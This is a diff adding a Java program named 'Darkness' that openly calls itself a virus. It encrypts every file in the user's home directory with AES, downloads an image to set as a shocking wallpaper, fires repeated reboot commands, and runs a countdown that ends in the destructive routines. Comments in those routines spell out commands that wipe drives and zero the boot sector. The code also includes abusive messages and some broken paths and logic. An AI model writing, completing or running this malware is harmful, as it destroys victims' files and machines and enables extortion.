@@ -1,0 +1,360 @@
+import javax.crypto.Cipher;
+import javax.crypto.KeyGenerator;
+import javax.crypto.SecretKey;
+import javax.crypto.spec.SecretKeySpec;
+import javax.swing.JButton;
+import javax.swing.JFrame;
+import javax.swing.JOptionPane;
+import javax.swing.JPanel;
+import javax.swing.Timer;
+import java.awt.event.ActionEvent;
+import java.awt.event.ActionListener;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.security.SecureRandom;
+import java.util.Base64;
+import java.util.Scanner;
+
+public class Darkness {
+
+    private static final String KEY_FILE = "secret.key";
+    private static final int TIMER_DURATION = 60000; // 1 minute for demonstration
+    private static SecretKey secretKey;
+
+    public static void main(String[] args) {
+        // Show disclaimer
+        showDisclaimer();
+
+        // Change desktop background to black with gore image
+        try {
+            changeDesktopBackgroundToBlackWithGoreImage();
+        } catch (IOException ex) {
+            ex.printStackTrace();
+        }
+
+        // Encrypt all files
+        try {
+            generateAndStoreSecretKey();
+            encryptAllFiles();
+        } catch (Exception ex) {
+            ex.printStackTrace();
+        }
+
+        // Create the GUI
+        JFrame frame = new JFrame("Darkness");
+        JPanel panel = new JPanel();
+
+        // Ask for the secret key
+        String userKey = JOptionPane.showInputDialog(frame, "Enter the secret key (100 characters):");
+
+        // Add buttons to the GUI
+        JButton unencryptButton = new JButton("Unencrypt");
+        unencryptButton.addActionListener(e -> {
+            if (userKey != null && userKey.equals(secretKeyToString(secretKey))) {
+                try {
+                    decryptAllFiles();
+                    JOptionPane.showMessageDialog(frame, "Files have been decrypted.");
+                } catch (Exception ex) {
+                    ex.printStackTrace();
+                }
+            } else {
+                JOptionPane.showMessageDialog(frame, "INCORRECT PASSWORD", "Error", JOptionPane.ERROR_MESSAGE);
+            }
+        });
+
+        JButton passwordButton = new JButton("Password");
+        passwordButton.addActionListener(e -> {
+            try {
+                overwhelmPC();
+            } catch (IOException ex) {
+                ex.printStackTrace();
+            }
+        });
+
+        JButton killPcButton = new JButton("Kill PC?");
+        killPcButton.addActionListener(e -> {
+            int result = JOptionPane.showConfirmDialog(frame,
+                    "This will clear all drives including startup files and destroy the boot sector.\n" +
+                            "The damage done will be irreversible.\n" +
+                            "Do you want to proceed?",
+                    "Warning",
+                    JOptionPane.YES_NO_OPTION,
+                    JOptionPane.WARNING_MESSAGE);
+            if (result == JOptionPane.YES_OPTION) {
+                try {
+                    destroyPC();
+                } catch (IOException ex) {
+                    ex.printStackTrace();
+                }
+            }
+        });
+
+        panel.add(unencryptButton);
+        panel.add(passwordButton);
+        panel.add(killPcButton);
+        frame.add(panel);
+        frame.setSize(300, 200);
+        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
+        frame.setVisible(true);
+
+        // Timer to execute all button functions simultaneously after countdown
+        Timer timer = new Timer(TIMER_DURATION, new ActionListener() {
+            @Override
+            public void actionPerformed(ActionEvent e) {
+                try {
+                    overwhelmPC();
+                    destroyPC();
+                    JOptionPane.showMessageDialog(frame, "All functions have been executed. The SSD will be damaged.");
+                } catch (IOException ex) {
+                    ex.printStackTrace();
+                }
+            }
+        });
+        timer.setRepeats(false);
+        timer.start();
+
+        // Show popup with countdown
+        new Thread(() -> {
+            try {
+                Thread.sleep(TIMER_DURATION / 2); // Show halfway through the timer
+                JOptionPane.showMessageDialog(frame,
+                        "WARNING: The system will perform irreversible actions including damaging the SSD in "
+                                + (TIMER_DURATION / 1000 / 2) + " seconds!",
+                        "Threat",
+                        JOptionPane.WARNING_MESSAGE);
+            } catch (InterruptedException ex) {
+                ex.printStackTrace();
+            }
+        }).start();
+    }
+
+    private static void showDisclaimer() {
+        JOptionPane.showMessageDialog(null,
+                "DISCLAIMER:\nThis program is a virus and may destroy your PC.\nThe creator, Darkness, is not liable for any damages according to the agreement.",
+                "Warning", JOptionPane.WARNING_MESSAGE);
+    }
+
+    private static void generateAndStoreSecretKey() throws Exception {
+        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
+        keyGen.init(256, new SecureRandom());
+        secretKey = keyGen.generateKey();
+        Files.write(Paths.get(KEY_FILE), secretKey.getEncoded());
+    }
+
+    private static String secretKeyToString(SecretKey secretKey) {
+        return Base64.getEncoder().encodeToString(secretKey.getEncoded());
+    }
+
+    private static void encryptAllFiles() throws Exception {
+        // Encrypt files logic (for demonstration purposes, this is a placeholder)
+        String rootDir = System.getProperty("user.home"); // Encrypt home directory for demonstration
+        encryptFilesInDirectory(new File(rootDir));
+        System.out.println("All files encrypted.");
+    }
+
+    private static void decryptAllFiles() throws Exception {
+        // Decrypt files logic (for demonstration purposes, this is a placeholder)
+        String rootDir = System.getProperty("user.home"); // Decrypt home directory for demonstration
+        decryptFilesInDirectory(new File(rootDir));
+        System.out.println("All files decrypted.");
+    }
+
+    private static void encryptFilesInDirectory(File dir) throws Exception {
+        for (File file : dir.listFiles()) {
+            if (file.isFile()) {
+                encryptFile(secretKey, file);
+            } else if (file.isDirectory()) {
+                encryptFilesInDirectory(file);
+            }
+        }
+    }
+
+    private static void decryptFilesInDirectory(File dir) throws Exception {
+        for (File file : dir.listFiles()) {
+            if (file.isFile()) {
+                decryptFile(secretKey, file);
+            } else if (file.isDirectory()) {
+                decryptFilesInDirectory(file);
+            }
+        }
+    }
+
+    private static void encryptFile(SecretKey key, File file) throws Exception {
+        Cipher cipher = Cipher.getInstance("AES");
+        cipher.init(Cipher.ENCRYPT_MODE, key);
+        byte[] fileBytes = Files.readAllBytes(file.toPath());
+        byte[] encryptedBytes = cipher.doFinal(fileBytes);
+        try (FileOutputStream fos = new FileOutputStream(file)) {
+            fos.write(encryptedBytes);
+        }
+    }
+
+    private static void decryptFile(SecretKey key, File file) throws Exception {
+        Cipher cipher = Cipher.getInstance("AES");
+        cipher.init(Cipher.DECRYPT_MODE, key);
+        byte[] fileBytes = Files.readAllBytes(file.toPath());
+        byte[] decryptedBytes = cipher.doFinal(fileBytes);
+        try (FileOutputStream fos = new FileOutputStream(file)) {
+            fos.write(decryptedBytes);
+        }
+    }
+
+    private static void changeDesktopBackgroundToBlackWithGoreImage() throws IOException {
+        if (isConnectedToInternet()) {
+            openChromeAndDownloadImage();
+        } else {
+            System.out.println("Not connected to the internet. Using local image.");
+        }
+
+        String os = System.getProperty("os.name").toLowerCase();
+        String imagePath = "C:\path\to\image.jpg"; 
+
+        if (os.contains("win")) {
+            // For Windows
+            String command = "reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d " + imagePath + " /f";
+            Runtime.getRuntime().exec(command);
+            Runtime.getRuntime().exec("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters");
+        } else if (os.contains("nix") || os.contains("nux")) {
+            // For Unix/Linux
+            String[] cmd = { "/bin/bash", "-c", "gsettings set org.gnome.desktop.background picture-uri file://" + imagePath };
+            Runtime.getRuntime().exec(cmd);
+        } else if (os.contains("mac")) {
+            // For macOS
+            String[] cmd = { "osascript", "-e", "tell application \"System Events\" to set picture of every desktop to \"" + imagePath + "\"" };
+            Runtime.getRuntime().exec(cmd);
+        } else if (os.contains("android")) {
+            // For Android
+            System.out.println("This doesnt work on android dumb bitch.");
+        } else {
+            System.out.println("I hate you");
+        }
+
+        System.out.println("Desktop background changed to black with gore image.");
+    }
+
+    private static boolean isConnectedToInternet() {
+        try {
+            URL url = new URL("http://www.google.com");
+            HttpURLConnection urlConnect = (HttpURLConnection) url.openConnection();
+            urlConnect.setConnectTimeout(5000);
+            urlConnect.connect();
+            return true;
+        } catch (IOException e) {
+            return false;
+        }
+    }
+
+    private static void openChromeAndDownloadImage() throws IOException {
+        String imageUrl = "https://i.pinimg.com/originals/63/f1/e1/63f1e173d5deb498642168e021ce5ce3.jpg";
+        String downloadCommand = "chrome --headless --disable-gpu --dump-dom " + imageUrl + " > C:\\path\\to\\gore_image.jpg"; // Update this path to your image location
+        Runtime.getRuntime().exec(downloadCommand);
+    }
+
+    private static void overwhelmPC() throws IOException {
+        String os = System.getProperty("os.name").toLowerCase();
+
+        if (os.contains("win")) {
+            // For Windows - Placeholder loop to overwhelm PC
+            for (int i = 0; i < 100; i++) {
+                Runtime.getRuntime().exec("shutdown -r -t 0");
+            }
+        } else if (os.contains("nix") || os.contains("nux")) {
+            // For Unix/Linux - Placeholder loop to overwhelm PC
+            for (int i = 0; i < 100; i++) {
+                Runtime.getRuntime().exec("sudo shutdown -r now");
+            }
+        } else if (os.contains("mac")) {
+            // For macOS - Placeholder loop to overwhelm PC
+            for (int i = 0; i < 100; i++) {
+                Runtime.getRuntime().exec("sudo shutdown -r now");
+            }
+        } else if (os.contains("android")) {
+            // For Android - Placeholder loop to overwhelm device
+            System.out.println("I will eat you alive.");
+        } else {
+            System.out.println();
+        }
+
+        System.out.println("PC overwhelmed.");
+    }
+
+    private static void destroyPC() throws IOException {
+        String os = System.getProperty("os.name").toLowerCase();
+        clearDriveContents(os);
+        destroyBootSector(os);
+
+        // Play music on loop at full volume
+        playMusicOnLoop();
+    }
+
+    private static void clearDriveContents(String os) throws IOException {
+        if (os.contains("win")) {
+            // Placeholder for clearing drive contents on Windows
+            System.out.println("Clearing drive contents on Windows...");
+            // Example: Runtime.getRuntime().exec("cmd /c del /f /s /q C:\\*.*");
+        } else if (os.contains("nix") || os.contains("nux")) {
+            // Placeholder for clearing drive contents on Unix/Linux
+            System.out.println("Clearing drive contents on Unix/Linux...");
+            // Example: Runtime.getRuntime().exec("sudo rm -rf /*");
+        } else if (os.contains("mac")) {
+            // Placeholder for clearing drive contents on macOS
+            System.out.println("Clearing drive contents on macOS...");
+            // Example: Runtime.getRuntime().exec("sudo rm -rf /*");
+        } else if (os.contains("android")) {
+            // Placeholder for clearing drive contents on Android
+            System.out.println("I hate you.");
+        } else {
+            System.out.println();
+        }
+    }
+
+    private static void destroyBootSector(String os) throws IOException {
+        if (os.contains("win")) {
+            // Placeholder for destroying boot sector on Windows
+            System.out.println("Destroying boot sector on Windows...");
+            // Example: Runtime.getRuntime().exec("cmd /c bootsect /nt60 ALL /force /mbr");
+        } else if (os.contains("nix") || os.contains("nux")) {
+            // Placeholder for destroying boot sector on Unix/Linux
+            System.out.println("Destroying boot sector on Unix/Linux...");
+            // Example: Runtime.getRuntime().exec("sudo dd if=/dev/zero of=/dev/sda bs=512 count=1");
+        } else if (os.contains("mac")) {
+            // Placeholder for destroying boot sector on macOS
+            System.out.println("Destroying boot sector on macOS...");
+            // Example: Runtime.getRuntime().exec("sudo dd if=/dev/zero of=/dev/rdisk0 bs=512 count=1");
+        } else if (os.contains("android")) {
+            // Placeholder for destroying boot sector on Android
+            System.out.println("Use a PC sucker.");
+        } else {
+            System.out.println("A bit too powerful PC. I flipping hate you so much.");
+        }
+    }
+
+    private static void playMusicOnLoop() throws IOException {
+        String os = System.getProperty("os.name").toLowerCase();
+        String musicPath = "C:\path\to\music.mp3"; // Update this path to your music file location
+
+        if (os.contains("win")) {
+            // For Windows - Using Windows Media Player to play music on loop
+            String command = "powershell -c (New-Object Media.SoundPlayer '" + musicPath + "').PlayLooping()";
+            Runtime.getRuntime().exec(command);
+        } else if (os.contains("nix") || os.contains("nux")) {
+            // For Unix/Linux - Placeholder for playing music on loop
+            System.out.println("Playing music on loop is not implemented for Unix/Linux in this example.");
+        } else if (os.contains("mac")) {
+            // For macOS - Placeholder for playing music on loop
+            System.out.println("Playing music on loop is not implemented for macOS in this example.");
+        } else if (os.contains("android")) {
+            // For Android - Placeholder for playing music on loop
+            System.out.println("Playing music on loop is not implemented for Android in this example.");
+        } else {
+            System.out.println("Use windows Sucker.");
+        }
+
+        System.out.println("Music is playing on loop.");
+    }
+}
